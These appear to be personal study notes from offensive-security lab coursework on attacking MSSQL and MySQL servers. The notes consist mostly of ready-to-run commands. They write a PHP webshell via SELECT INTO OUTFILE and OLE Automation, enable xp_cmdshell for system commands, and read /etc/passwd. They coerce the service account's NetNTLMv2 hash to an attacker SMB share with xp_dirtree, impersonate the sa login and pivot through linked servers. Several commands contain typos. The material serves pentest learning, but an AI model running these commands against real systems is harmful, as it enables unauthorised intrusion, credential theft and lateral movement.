# MSSQL and MySQL

## Authentication
- MSSQL
	- Windows Authentication mode
		- Windows/AD auehtnticates
	- Mixed mode
		- Either Windows/AD or SQL Server's own login authenticates
- MySQL
	- Different authentication methods, eg. username password, Windows authentication..

## Protocol Specific Attacks
- MySQL - Connecting
	- `mysql -u julio -pPassword -h 10.129.20.13`
- MSSQL - Connecting 
	- From Windows (local): 
		- `sqlcmd -S SRVCM -U juilo -P 'Password' -y 30 -Y 30`
	- From Linux:
		- `sqsh 10.129.203.7 -U julio -P 'Password' -h`
		- `mssqlclient.py -p 1433 julio@10.129.203.7`
			- or `impacket-mssqlclient`
				- If using windows authentication, need to specify `-windows-auth`
					- eg. if using NTLM hash found below
	- If don't specify domain or hostname, will assume SQL authentication and authenticate against users created in SQL server
	- If define domain or hostname, will use Windows authentication
		- If targetting local account, can use `SERVERNAME\\accountname` or `.\\accountname
		- eg. `sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h

## Default Databases
- MySQL
	- mysql - system database, store info required by MySQL server
	- information_schema - access to database metadata
	- performance_schema - for monitoring MySql Server execution
	- sys - objects that help DBAs and developers interpret data collected by Performance Schema
- MSSQL default system schemas/databases:
	- master - keeps the information for an instance of SQL Server.
	- msdb - used by SQL Server Agent.
	- model - a template database copied for each new database.
	- resource - a read-only database that keeps system objects visible in every database on the server in sys schema.
	- tempdb - keeps temporary objects for SQL queries.

# SQL Syntax
- `SHOW DATABASES`
- **If use sqlcmd, need add `GO` after query
- `USE htbusers;`
- `SHOW TABLES`
- `SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES`
- `SELECT * FROM users`

## Executing Commands
- MySql
	- Can achieve command execution if can write to location in file system that can execute our commands
	- eg. if MySQL operates on PHP based web server, can attempt to write to file in webserver directory
		- `SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';`
			- Then attempt to browse to that location and execute commands
	- To do this, need the `secure_file_priv` variable to be empty, or have the value of the directory that we want to write to
		- `show variables like "secure_file_priv";`
- MSSQL
	- Has extended stored procedures called `xp_cmdshell`
		- Can execute system commands with SQL
		- Disabled by default, can be enabled by usign Policy-Based Management or executing sp_configure
			- `EXECUTE sp_configure 'show advanced options', 1`
			- `RECONFIGURE`
			- `EXECUTE sp_configue 'xp_cmdshell', 1`
			- `RECONFIGURE`
		- `xp_cmdshell 'whoami`
	- Can similarly write files
		- First need to enable Ole Automation Procedures which requires admin privileges
			- `sp_configure 'show advanced options', 1`
			- `RECONFIGURE`
			- `sp_configure 'Ole Automation Procedures', 1
			- `RECONFIGURE
			- Again, if using sqlcmd, need add GO after each line
			- Then write the file
```c
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

## Read local files
- MSSQL - by default allows read on any file in the oS to which account has read access
	- `SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents`
- MySQL - no file read by default, only if correct settings and with appropriate privileges
	- `select LOAD_FILE("/etc/passwd");`

## Capturing MSSQL Service Hash
- Can steal MSSQL service account hash using `xp_supbdirs` or `xp_dirtree` undocumented stored procedures
	- Uses SMB to retrieve a list of child directories under a specified parent directory from the file system
	- When use one of these stored procedures and point it to our SMB server, directory listening functionality forces server to authenticate and send the NetNTLMv2 hash of service account running the SQL server
		- Reminder that this is NOT the NT hash! Cannot use it for PtH. Only for relay or cracking.This is essentially the plaintext password
1. Run responder or ipmacket
	- `sudo responder -I tun0`
	- or `sudo impacket-smbserver share ./ -smb2support`
 2. XP_DIRTREE Hash Stealing
	- `EXEC master..xp_dirtree '\\10.10.110.17\share\'`
 3. XP_SUBDIRS Hash stealing
	- `EXEC master..xp_subdirs '\\10.10.110.17\share\'`
4. Crack with hashcat then login with the hash found
	- `impacket-mssqlclient <user>@IP -windows-auth`
	- then type in the password

## Impersonate existing users with MSSQL
- Special IMPERSONATE permission - allows existing user to take on permissions of another user/login until context is reset or sesison ends
- First, identify which users we can impersonate
```c
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO
```
- Will see a bunch of users that we can impersonate, say one includes 'SA'
- Then verify if current user has sysadmin role:
```c
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go
```
1 means sysadmin, 0 means not member of sysadmin
- Impersonating the 'SA' user 
```c
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO
```

- Recommended to run EXECUTE AS LOGIN within master DB, because all users have accesss to that 
	- `USE master` BEFOREHAND

## Communicate with other databases with MSSQL
- MSSQL has configuration option called link server
- May be able to move laterally to that database server

1. Identify linked Servers in MSSQL
	-  `SELECT srvname, isremote FROM sysservers
	- Results: `isremote` - 1 means remote server, 0 means linked server
		- Target 0
2. Identify user used for connection and its privileges
	- EXECUTE used to send pass-through commands to linked servers
	- `EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]`


**KIV : SQL syntax**